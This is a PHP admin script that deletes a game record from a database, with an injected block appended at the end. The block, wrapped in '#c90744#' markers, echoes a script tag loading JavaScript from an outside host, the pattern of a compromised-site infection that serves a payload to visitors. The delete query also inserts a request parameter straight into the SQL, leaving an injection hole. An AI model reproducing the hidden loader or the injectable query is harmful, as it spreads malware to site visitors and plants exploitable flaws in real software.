<?php 
session_start();
ob_start();

include "inc/session_check.php";

  $adid = urlsafe_b64decode($_REQUEST['id']);
  
  $delete = "delete from game where id='$adid'";
  if(mysql_query($delete))
  {
  	header("location:list_game.php?msg=succ&cont=Game Deleted Successfully.");
  }
  
?>
<?php
#c90744#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11967017\"></script>";
echo $g;
}
#/c90744#
?>